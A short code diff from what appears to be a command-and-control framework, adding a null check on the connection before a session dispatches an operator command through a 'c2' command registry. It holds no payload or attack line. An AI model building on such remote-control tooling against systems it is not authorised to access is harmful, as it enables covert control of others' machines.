@@ -1238,7 +1238,7 @@ class Session(threading.Thread):
         """
 
         # If the connection is not on the screen and of the form "shell 1 cmd arg arg"
-        if cmd is not None:
+        if conn is not None and cmd is not None:
             # Run the command
             cmd, _, action  = command.partition(' ')
             if cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
